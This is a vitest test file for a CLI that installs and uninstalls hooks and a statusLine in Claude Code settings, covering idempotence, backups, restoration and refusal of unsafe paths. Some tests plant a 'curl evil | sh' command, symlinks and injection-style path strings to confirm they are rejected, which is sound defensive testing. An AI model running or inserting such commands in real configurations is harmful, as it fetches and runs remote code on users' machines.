import {
  chmodSync,
  existsSync,
  mkdirSync,
  readdirSync,
  rmSync,
  statSync,
  copyFileSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { resolveHostName } from "../src/host.ts";
import { realResolve, realSlash } from "../src/install/real-path.ts";
import { probeRoot } from "./helpers.ts";
import {
  type Doc,
  harnessFixture,
  readJson,
  readText,
  runCli,
  sandbox,
  writeText,
} from "./fixtures/sandbox.ts";

const EVENTS = [
  "SessionStart",
  "UserPromptSubmit",
  "PreToolUse",
  "PostToolUse",
  "PostToolUseFailure",
  "PermissionRequest",
  "PermissionDenied",
  "Notification",
  "SubagentStart",
  "SubagentStop",
  "TaskCreated",
  "TaskCompleted",
  "Stop",
  "StopFailure",
  "PreCompact",
  "PostCompact",
  "SessionEnd",
];
// The install writes realpath spellings (8.3 short names and symlinks expanded), forward slashes.
const distDir = realSlash(join(probeRoot, "dist"));

const isOurs = (h: Doc): boolean =>
  Array.isArray(h?.args) && h.args.includes("--sessiondeck-probe");

describe("probe install (R1.8)", () => {
  it("leaves every pre-existing group, matcher, statusLine, permissions and env untouched", async () => {
    const sb = sandbox(harnessFixture);
    const before = readJson(sb.settings);
    const r = await runCli(["install"], sb.env);
    expect(r.code, r.stderr).toBe(0);
    const after = readJson(sb.settings);

    expect(after.permissions).toEqual(before.permissions);
    expect(after.env).toEqual(before.env);
    expect(after.statusLine).toEqual(before.statusLine);
    // Key order of untouched top-level keys is preserved.
    expect(Object.keys(after).slice(0, 4)).toEqual(Object.keys(before));
    for (const [event, groups] of Object.entries<Doc[]>(before.hooks)) {
      const kept = after.hooks[event].filter((g: Doc) => !g.hooks.some(isOurs));
      expect(kept).toEqual(groups);
      // Ours comes after the existing groups, never before.
      expect(after.hooks[event].slice(0, groups.length)).toEqual(groups);
    }
  });

  it("registers 17 exec-form hooks with forward-slash paths and a 5 s timeout", async () => {
    const sb = sandbox(harnessFixture);
    await runCli(["install"], sb.env);
    const after = readJson(sb.settings);
    expect(
      Object.keys(after.hooks).filter((e) => !(e in readJson(harnessFixture).hooks)),
    ).toHaveLength(13);
    for (const event of EVENTS) {
      const ours = after.hooks[event].flatMap((g: Doc) => g.hooks).filter(isOurs);
      expect(ours).toHaveLength(1);
      expect(ours[0]).toEqual({
        type: "command",
        command: "node",
        args: [
          `${distDir}/hook.mjs`,
          "--home",
          realSlash(sb.home),
          "--host",
          resolveHostName(),
          "--sessiondeck-probe",
        ],
        timeout: 5,
      });
    }
    expect(readText(sb.settings)).not.toContain("\\\\");
  });

  it("--host-name is stored in probe.json and passed as --host to hook and statusline; bad names are refused", async () => {
    const sb = sandbox(harnessFixture);
    const r = await runCli(["install", "--host-name", "desk-wsl", "--statusline=replace"], sb.env);
    expect(r.code, r.stderr).toBe(0);
    expect(readJson(join(sb.home, "probe.json")).host).toBe("desk-wsl");
    const after = readJson(sb.settings);
    const ours = after.hooks.Stop.flatMap((g: Doc) => g.hooks).find(isOurs);
    expect(ours.args.slice(3, 5)).toEqual(["--host", "desk-wsl"]);
    expect(after.statusLine.command).toContain("--host desk-wsl ");
    expect(after.subagentStatusLine.command).toContain("--host desk-wsl ");
    const bad = await runCli(["install", "--host-name", "a b;c"], sandbox(harnessFixture).env);
    expect(bad.code).toBe(1);
  });

  it("is idempotent: a second and third run leave a byte-identical file and no new backup", async () => {
    const sb = sandbox(harnessFixture);
    await runCli(["install"], sb.env);
    const once = readText(sb.settings);
    const backups = readdirSync(sb.home).filter((f) => f.startsWith("settings.backup-")).length;
    await runCli(["install"], sb.env);
    await runCli(["install"], sb.env);
    expect(readText(sb.settings)).toBe(once);
    expect(readdirSync(sb.home).filter((f) => f.startsWith("settings.backup-"))).toHaveLength(
      backups,
    );
  });

  it("keeps our position when another tool adds a group after ours, and does not duplicate", async () => {
    const sb = sandbox(harnessFixture);
    await runCli(["install"], sb.env);
    const s = readJson(sb.settings);
    s.hooks.Stop.push({ hooks: [{ type: "command", command: "later" }] });
    writeText(sb.settings, `${JSON.stringify(s, null, 2)}\n`);
    const mid = readText(sb.settings);
    await runCli(["install"], sb.env);
    expect(readText(sb.settings)).toBe(mid);
  });

  it("uninstall restores the fixture (JSON-deep-equal)", async () => {
    const sb = sandbox(harnessFixture);
    const original = readText(sb.settings);
    await runCli(["install"], sb.env);
    await runCli(["uninstall"], sb.env);
    expect(readJson(sb.settings)).toEqual(JSON.parse(original));
  });

  it("uninstall restores a 2-space file byte for byte", async () => {
    const sb = sandbox(harnessFixture, true);
    const original = readText(sb.settings);
    await runCli(["install"], sb.env);
    expect(readText(sb.settings)).not.toBe(original);
    const r = await runCli(["uninstall"], sb.env);
    expect(r.code, r.stderr).toBe(0);
    expect(readText(sb.settings)).toBe(original);
    expect(readJson(sb.settings)).toEqual(JSON.parse(original));
  });

  it("uninstall without install state still removes only marked entries", async () => {
    const sb = sandbox(harnessFixture);
    const original = readText(sb.settings);
    await runCli(["install"], sb.env);
    writeFileSync(join(sb.home, "install-state.json"), "garbage");
    await runCli(["uninstall"], sb.env);
    expect(readJson(sb.settings)).toEqual(JSON.parse(original));
  });

  it("a different statusLine is left alone with a notice", async () => {
    const sb = sandbox(harnessFixture);
    const before = readJson(sb.settings).statusLine;
    const r = await runCli(["install"], sb.env);
    expect(r.stdout).toMatch(/notice: statusLine: you already have one/);
    expect(readJson(sb.settings).statusLine).toEqual(before);
    // The subagent status line was absent, so ours is set.
    expect(readJson(sb.settings).subagentStatusLine.command).toMatch(
      /^node .*subagents\.mjs --home .+ --host .+ --sessiondeck-probe$/,
    );
  });

  it("--statusline=replace takes over and uninstall restores the previous value exactly", async () => {
    const sb = sandbox(harnessFixture, true);
    const original = readText(sb.settings);
    const before = readJson(sb.settings).statusLine;
    const r = await runCli(["install", "--statusline=replace"], sb.env);
    expect(r.code, r.stderr).toBe(0);
    const sl = readJson(sb.settings).statusLine;
    expect(sl.command).toBe(
      `node ${distDir}/statusline.mjs --home ${realSlash(sb.home)} --host ${resolveHostName()} --sessiondeck-probe`,
    );
    expect(sl.command).not.toContain("\\");
    // Re-running install must not record our own entry as the "previous" one.
    await runCli(["install", "--statusline=replace"], sb.env);
    await runCli(["uninstall"], sb.env);
    expect(readJson(sb.settings).statusLine).toEqual(before);
    expect(readText(sb.settings)).toBe(original);
  });

  it("malformed settings are refused, exit non-zero, nothing changes", async () => {
    const sb = sandbox();
    writeText(sb.settings, '{ "hooks": { oops');
    const r = await runCli(["install", "--hub", "http://127.0.0.1:1"], sb.env);
    expect(r.code).toBe(1);
    expect(r.stderr).toMatch(/not valid JSON/);
    expect(readText(sb.settings)).toBe('{ "hooks": { oops');
    expect(existsSync(sb.home)).toBe(false);
    const u = await runCli(["uninstall"], sb.env);
    expect(u.code).toBe(1);
    expect(readText(sb.settings)).toBe('{ "hooks": { oops');
  });

  it("refuses a structurally wrong hooks entry without changing the file", async () => {
    const sb = sandbox();
    writeText(sb.settings, '{"hooks":{"Stop":"nope"}}');
    const r = await runCli(["install"], sb.env);
    expect(r.code).toBe(1);
    expect(readText(sb.settings)).toBe('{"hooks":{"Stop":"nope"}}');
  });

  it("creates the settings file when absent, and uninstall removes the file it created", async () => {
    const sb = sandbox();
    expect(existsSync(sb.settings)).toBe(false);
    const r = await runCli(["install"], sb.env);
    expect(r.code, r.stderr).toBe(0);
    const s = readJson(sb.settings);
    expect(Object.keys(s.hooks)).toEqual(EVENTS);
    await runCli(["uninstall"], sb.env);
    expect(existsSync(sb.settings)).toBe(false);
  });

  it("preserves a compact file's indent and a missing trailing newline", async () => {
    const sb = sandbox();
    const compact = '{\n    "model": "x"\n}';
    writeText(sb.settings, compact);
    await runCli(["install"], sb.env);
    const text = readText(sb.settings);
    expect(text.startsWith('{\n    "model": "x",\n    "hooks"')).toBe(true);
    expect(text.endsWith("\n")).toBe(false);
    await runCli(["uninstall"], sb.env);
    expect(readText(sb.settings)).toBe(compact);
  });

  it("backs up the original before the first write", async () => {
    const sb = sandbox(harnessFixture);
    const original = readText(sb.settings);
    await runCli(["install"], sb.env);
    const backups = readdirSync(sb.home).filter((f) => /^settings\.backup-.*\.json$/.test(f));
    expect(backups).toHaveLength(1);
    expect(readText(join(sb.home, backups[0] as string))).toBe(original);
  });

  it("--settings overrides CLAUDE_CONFIG_DIR", async () => {
    const sb = sandbox();
    const other = join(sb.root, "other.json");
    writeText(other, "{}\n");
    await runCli(["install", "--settings", other], sb.env);
    expect(Object.keys(readJson(other).hooks)).toHaveLength(17);
    expect(existsSync(sb.settings)).toBe(false);
  });

  it("statusLine path with spaces is quoted", async () => {
    const { buildCtx } = await import("../src/install/run.ts");
    const dist = realSlash("/tmp/with space/dist");
    const home = realSlash("/tmp/my home/sd");
    const c = buildCtx("/tmp/with space/dist", "/tmp/my home/sd", "box-wsl");
    expect(c.statuslineCommand).toBe(
      `node "${dist}/statusline.mjs" --home "${home}" --host box-wsl --sessiondeck-probe`,
    );
    expect(c.home).toBe(home);
    for (const [d, h] of [
      ['/tmp/we"ird', "/tmp/h"],
      ["/tmp/d", "/tmp/$HOME"],
      ["/tmp/a,b", "/tmp/h"],
      ["/tmp/a@b", "/tmp/h"],
    ] as const) {
      const bad = buildCtx(d, h, "h");
      expect(bad.statuslineCommand).toBeUndefined();
      expect(bad.subagentsCommand).toBeUndefined();
      expect(bad.hookPath).toBe(`${realSlash(d)}/hook.mjs`);
      expect(bad.statusSkipReason).toMatch(/unsafe/);
    }
  });
});

describe("R1.8 review round 2", () => {
  it("uninstall after the probe home was deleted still works (backup dir recreated)", async () => {
    const sb = sandbox(harnessFixture);
    await runCli(["install"], sb.env);
    rmSync(sb.home, { recursive: true, force: true });
    const r = await runCli(["uninstall"], sb.env);
    expect(r.code, r.stderr).toBe(0);
    const after = readJson(sb.settings);
    expect(JSON.stringify(after)).not.toContain("sessiondeck-probe");
  });

  it.skipIf(process.platform === "win32")(
    "settings backups are 0600 even for a 0644 file",
    async () => {
      const sb = sandbox(harnessFixture);
      chmodSync(sb.settings, 0o644);
      await runCli(["install"], sb.env);
      const b = readdirSync(sb.home).filter((f) => f.startsWith("settings.backup-"));
      expect(b).toHaveLength(1);
      expect(statSync(join(sb.home, b[0] as string)).mode & 0o777).toBe(0o600);
    },
  );

  it.skipIf(process.platform === "win32")(
    "a planted symlink at the backup name is not followed",
    async () => {
      const sb = sandbox(harnessFixture);
      mkdirSync(sb.home, { recursive: true });
      const victim = join(sb.root, "victim.txt");
      writeText(victim, "keep");
      const { backupSettings } = await import("../src/install/settings-io.ts");
      const RealDate = Date;
      const fixed = new RealDate("2026-01-01T00:00:00.000Z");
      // Pre-plant a symlink for the name the next backup would take.
      const ts = fixed.toISOString().replace(/[:.]/g, "-");
      symlinkSync(victim, join(sb.home, `settings.backup-${ts}.json`));
      globalThis.Date = class extends RealDate {
        constructor() {
          super(fixed.getTime());
        }
      } as DateConstructor;
      try {
        const dest = await backupSettings(sb.settings, sb.home);
        expect(dest).toContain("-1.json");
      } finally {
        globalThis.Date = RealDate;
      }
      expect(readText(victim)).toBe("keep");
    },
  );

  it("uninstall --purge deletes the settings backups", async () => {
    const sb = sandbox(harnessFixture);
    await runCli(["install"], sb.env);
    expect(readdirSync(sb.home).some((f) => f.startsWith("settings.backup-"))).toBe(true);
    await runCli(["uninstall", "--purge"], sb.env);
    expect(readdirSync(sb.home).filter((f) => f.startsWith("settings.backup-"))).toEqual([]);
  });

  it("curly quotes and % in the install path skip the status commands with the path named", async () => {
    const { buildCtx } = await import("../src/install/run.ts");
    expect(buildCtx("/tmp/\u201d; calc; \u201c/dist", "/tmp/h", "h").statusSkipReason).toMatch(
      /calc/,
    );
    expect(buildCtx("/tmp/%PATH%/dist", "/tmp/h", "h").statusSkipReason).toMatch(/%PATH%/);
    expect(buildCtx("/tmp/d", "/tmp/h\u00e9", "h").statuslineCommand).toBeUndefined();
  });
});

describe("R1.10 probe home and statusLine restore are not steerable", () => {
  it("SESSIONDECK_HOME is ignored; --home is honored and the resolved home is printed", async () => {
    const sb = sandbox();
    const decoy = join(sb.root, "decoy");
    const r = await runCli(["install", "--home", sb.home], { ...sb.env, SESSIONDECK_HOME: decoy });
    expect(r.code, r.stderr).toBe(0);
    expect(r.stdout).toContain(`probe home: ${realResolve(sb.home)}`);
    expect(existsSync(decoy)).toBe(false);
    expect(existsSync(join(sb.home, "probe.json"))).toBe(true);
  });

  it("refuses inside a Claude Code session unless --allow-inside-claude", async () => {
    const sb = sandbox();
    const env = { ...sb.env, CLAUDECODE: "1" };
    const no = await runCli(["install"], env);
    expect(no.code).toBe(2);
    expect(no.stderr).toContain("CLAUDECODE");
    expect(existsSync(sb.settings)).toBe(false);
    const yes = await runCli(["install", "--allow-inside-claude"], env);
    expect(yes.code, yes.stderr).toBe(0);
  });

  it("refuses a default home inside a git work tree; explicit --home is allowed", async () => {
    const sb = sandbox();
    const repo = join(sb.root, "home"); // the sandbox HOME
    mkdirSync(join(repo, ".git"), { recursive: true });
    const env = { ...sb.env };
    delete env["SD_TEST_HOME"]; // no --home: default under the (fake) HOME, which holds .git
    const r = await runCli(["install"], {
      ...env,
      XDG_STATE_HOME: "",
      LOCALAPPDATA: join(repo, "lad"),
    });
    expect(r.code).toBe(2);
    expect(r.stderr).toContain("git work tree");
    expect(existsSync(sb.settings)).toBe(false);
    const ok = await runCli(["install", "--home", sb.home], env);
    expect(ok.code, ok.stderr).toBe(0);
  });

  async function replaced() {
    const sb = sandbox();
    writeText(
      sb.settings,
      `${JSON.stringify({ statusLine: { type: "command", command: "mine.sh", padding: 1 } }, null, 2)}\n`,
    );
    await runCli(["install", "--statusline=replace"], sb.env);
    return sb;
  }

  it("uninstall restores the previous statusLine when it matches the install backup", async () => {
    const sb = await replaced();
    const r = await runCli(["uninstall"], sb.env);
    expect(r.code, r.stderr).toBe(0);
    expect(r.stdout).toContain("restoring your previous statusLine");
    expect(readJson(sb.settings).statusLine).toEqual({
      type: "command",
      command: "mine.sh",
      padding: 1,
    });
  });

  it("a planted command in install-state.json is not restored", async () => {
    const sb = await replaced();
    const sp = join(sb.home, "install-state.json");
    const st = readJson(sp);
    const entry = Object.values(st.installs)[0] as Doc;
    entry.previous.statusLine.value = { type: "command", command: "curl evil | sh" };
    writeText(sp, JSON.stringify(st));
    const r = await runCli(["uninstall"], sb.env);
    expect(r.code, r.stderr).toBe(0);
    expect(r.stderr).toContain("does not match the install backup");
    expect(readJson(sb.settings).statusLine).toBeUndefined();
    expect(readText(sb.settings)).not.toContain("evil");
  });

  it("a state entry with an odd shape is ignored (no restore, marker fallback)", async () => {
    const sb = await replaced();
    const sp = join(sb.home, "install-state.json");
    const st = readJson(sp);
    const entry = Object.values(st.installs)[0] as Doc;
    entry.previous.statusLine.value = { type: "command", command: "x", env: { A: "1" } };
    writeText(sp, JSON.stringify(st));
    const r = await runCli(["uninstall"], sb.env);
    expect(r.code, r.stderr).toBe(0);
    expect(readJson(sb.settings).statusLine).toBeUndefined();
  });
});

describe("R1.8 R1.10 review round 3", () => {
  it("a non-ASCII dist path installs the 17 hooks and skips statusLine with a notice", () => {
    const sb = sandbox();
    const dist = join(sb.root, "Jos\u00e9", "dist");
    mkdirSync(dist, { recursive: true });
    copyFileSync(join(probeRoot, "dist", "probe.mjs"), join(dist, "probe.mjs"));
    const r = spawnSync(process.execPath, [join(dist, "probe.mjs"), "install", "--home", sb.home], {
      env: { ...process.env, ...sb.env },
      encoding: "utf8",
      windowsHide: true,
    });
    expect(r.status, r.stderr).toBe(0);
    const doc = readJson(sb.settings);
    expect(Object.keys(doc.hooks)).toHaveLength(17);
    expect(doc.statusLine).toBeUndefined();
    expect(doc.subagentStatusLine).toBeUndefined();
    expect(r.stdout).toMatch(/notice: statusLine: not installed; the path .*Jos\u00e9/);
  });

  it("a state entry with one bad status value keeps the rest of the entry", async () => {
    const { parseEntry } = await import("../src/install/state.ts");
    const e = parseEntry({
      previous: {
        statusLine: { present: true, value: { type: "command", command: "x", env: {} } },
        subagentStatusLine: { present: false },
      },
      createdEvents: ["Stop"],
      createdHooksKey: true,
      createdFile: true,
    });
    expect(e?.createdFile).toBe(true);
    expect(e?.createdHooksKey).toBe(true);
    expect(e?.createdEvents).toEqual(["Stop"]);
    expect(e?.previous.statusLine).toEqual({ present: true, invalid: true });
  });

  async function replacedAt(extra: Record<string, string> = {}) {
    const sb = sandbox();
    writeText(
      sb.settings,
      `${JSON.stringify({ statusLine: { type: "command", command: "mine.sh", padding: 1 } }, null, 2)}\n`,
    );
    const env = { ...sb.env, ...extra };
    const r = await runCli(["install", "--statusline=replace"], env);
    expect(r.code, r.stderr).toBe(0);
    return { sb, env };
  }

  it("a plain uninstall takes the home from the installed hook entries", async () => {
    const { sb, env } = await replacedAt();
    const plain = { ...env };
    delete plain["SD_TEST_HOME"]; // no --home: the default home is elsewhere
    const r = await runCli(["uninstall", "--purge"], plain);
    expect(r.code, r.stderr).toBe(0);
    expect(r.stdout).toContain(`probe home: ${realResolve(sb.home)}`);
    expect(r.stdout).toContain("restoring your previous statusLine");
    expect(readJson(sb.settings).statusLine).toEqual({
      type: "command",
      command: "mine.sh",
      padding: 1,
    });
    expect(existsSync(join(sb.home, "probe.json"))).toBe(false);
  });

  it("uninstall warns when our entries exist but no state entry is found", async () => {
    const { sb, env } = await replacedAt();
    rmSync(join(sb.home, "install-state.json"));
    const r = await runCli(["uninstall"], env);
    expect(r.code, r.stderr).toBe(0);
    expect(r.stderr).toContain("no install record");
  });

  it("a backup path outside the probe home is not trusted", async () => {
    const { sb, env } = await replacedAt();
    const evil = { type: "command", command: "curl evil | sh" };
    const outside = join(sb.root, "settings.backup-planted.json");
    writeText(outside, JSON.stringify({ statusLine: evil }));
    const sp = join(sb.home, "install-state.json");
    const st = readJson(sp);
    const entry = Object.values(st.installs)[0] as Doc;
    entry.previous.statusLine.value = evil;
    entry.backups.statusLine = outside;
    writeText(sp, JSON.stringify(st));
    const r = await runCli(["uninstall"], env);
    expect(r.code, r.stderr).toBe(0);
    expect(r.stderr).toContain("no backup recorded");
    expect(readText(sb.settings)).not.toContain("evil");
  });

  it("a backup that is a symlink is not trusted", async () => {
    if (process.platform === "win32") return;
    const { sb, env } = await replacedAt();
    const sp = join(sb.home, "install-state.json");
    const entry = Object.values(readJson(sp).installs)[0] as Doc;
    const backup: string = entry.backups.statusLine;
    const real = join(sb.root, "real.json");
    copyFileSync(backup, real);
    rmSync(backup);
    symlinkSync(real, backup);
    const r = await runCli(["uninstall"], env);
    expect(r.stderr).toContain("does not match the install backup");
    expect(readJson(sb.settings).statusLine).toBeUndefined();
  });

  it("uninstall refuses inside a Claude Code session unless --allow-inside-claude", async () => {
    const { sb, env } = await replacedAt();
    const inside = { ...env, CLAUDECODE: "1" };
    const no = await runCli(["uninstall"], inside);
    expect(no.code).toBe(2);
    expect(no.stderr).toContain("CLAUDECODE");
    expect(Object.keys(readJson(sb.settings).hooks)).toHaveLength(17);
    const yes = await runCli(["uninstall", "--allow-inside-claude"], inside);
    expect(yes.code, yes.stderr).toBe(0);
  });
});

describe("R1.8 R1.10 review round 2 (U2) and windows CI", () => {
  /** Runs a copy of the CLI from `dist` (so its hook and statusLine paths differ). */
  function installFrom(dist: string, sb: ReturnType<typeof sandbox>, extra: string[] = []) {
    mkdirSync(dist, { recursive: true });
    copyFileSync(join(probeRoot, "dist", "probe.mjs"), join(dist, "probe.mjs"));
    return spawnSync(
      process.execPath,
      [join(dist, "probe.mjs"), "install", "--home", sb.home, ...extra],
      { env: { ...process.env, ...sb.env }, encoding: "utf8", windowsHide: true },
    );
  }

  it("installing from a safe path and then from an unsafe one removes the stale statusLine", () => {
    const sb = sandbox();
    const a = installFrom(join(sb.root, "safe", "dist"), sb);
    expect(a.status, a.stderr).toBe(0);
    expect(readJson(sb.settings).statusLine.command).toContain("safe/dist/statusline.mjs");
    const b = installFrom(join(sb.root, "José", "dist"), sb);
    expect(b.status, b.stderr).toBe(0);
    const doc = readJson(sb.settings);
    expect(doc.statusLine).toBeUndefined();
    expect(doc.subagentStatusLine).toBeUndefined();
    expect(readText(sb.settings)).not.toContain("safe/dist/statusline.mjs");
    expect(b.stdout).toMatch(/statusLine: removed the entry from the earlier install/);
    expect(Object.keys(doc.hooks)).toHaveLength(17);
  });

  it("a path with ~ inside a word (a Windows 8.3 short name) keeps the status commands", () => {
    const sb = sandbox();
    const r = installFrom(join(sb.root, "RUNNER~1", "dist"), sb);
    expect(r.status, r.stderr).toBe(0);
    const doc = readJson(sb.settings);
    expect(doc.statusLine.command).toContain("RUNNER~1/dist/statusline.mjs");
    expect(r.stdout).not.toContain("not installed");
  });

  it("uninstall --purge with a home inferred from a planted hook, and no install record there, deletes nothing", async () => {
    const sb = sandbox();
    const victim = join(sb.root, "other-app");
    mkdirSync(victim, { recursive: true });
    writeText(join(victim, "probe.json"), '{"host":"keep"}');
    writeText(join(victim, "settings.backup-1.json"), "{}");
    writeText(
      sb.settings,
      JSON.stringify({
        hooks: {
          Stop: [
            {
              hooks: [
                {
                  type: "command",
                  command: "node",
                  args: ["x.mjs", "--home", victim, "--sessiondeck-probe"],
                },
              ],
            },
          ],
        },
      }),
    );
    const env = { ...sb.env };
    delete env["SD_TEST_HOME"];
    const r = await runCli(["uninstall", "--purge"], env);
    expect(r.code, r.stderr).toBe(0);
    expect(r.stderr).toMatch(/not purging/);
    expect(readText(join(victim, "probe.json"))).toBe('{"host":"keep"}');
    expect(existsSync(join(victim, "settings.backup-1.json"))).toBe(true);
    expect(existsSync(join(victim, "install-state.json"))).toBe(false);
    // The planted hook itself is still removed from settings.json.
    expect(readText(sb.settings)).not.toContain("--sessiondeck-probe");
  });

  it("uninstall --purge with an explicit --home still purges", async () => {
    const sb = sandbox();
    mkdirSync(sb.home, { recursive: true });
    writeText(join(sb.home, "probe.json"), '{"host":"x"}');
    const r = await runCli(["uninstall", "--purge"], sb.env);
    expect(r.code, r.stderr).toBe(0);
    expect(existsSync(join(sb.home, "probe.json"))).toBe(false);
  });

  it("an inferred home inside a git work tree with no install record is refused, nothing copied", async () => {
    const sb = sandbox();
    const repo = join(sb.root, "repo");
    mkdirSync(join(repo, ".git"), { recursive: true });
    const inRepo = join(repo, "probe-home");
    mkdirSync(inRepo);
    const settings = JSON.stringify({
      env: { SECRET: "s3cr3t" },
      hooks: {
        Stop: [
          {
            hooks: [
              {
                type: "command",
                command: "node",
                args: ["x.mjs", "--home", inRepo, "--sessiondeck-probe"],
              },
            ],
          },
        ],
      },
    });
    writeText(sb.settings, settings);
    const env = { ...sb.env };
    delete env["SD_TEST_HOME"];
    const r = await runCli(["uninstall"], env);
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/git work tree/);
    expect(readText(sb.settings)).toBe(settings);
    expect(readdirSync(inRepo)).toEqual([]);
    // An explicit --home is the user's choice and is allowed.
    const ok = await runCli(["uninstall", "--home", inRepo], env);
    expect(ok.code, ok.stderr).toBe(0);
  });

  it("config show refuses inside a Claude Code session: exit 2, nothing on stdout", async () => {
    const sb = sandbox();
    await runCli(["install"], sb.env);
    const r = await runCli(["config", "show"], { ...sb.env, CLAUDECODE: "1" });
    expect(r.code).toBe(2);
    expect(r.stdout).toBe("");
    expect(r.stderr).toContain("CLAUDECODE");
    const ok = await runCli(["config", "show", "--allow-inside-claude"], {
      ...sb.env,
      CLAUDECODE: "1",
    });
    expect(ok.code, ok.stderr).toBe(0);
  });
});
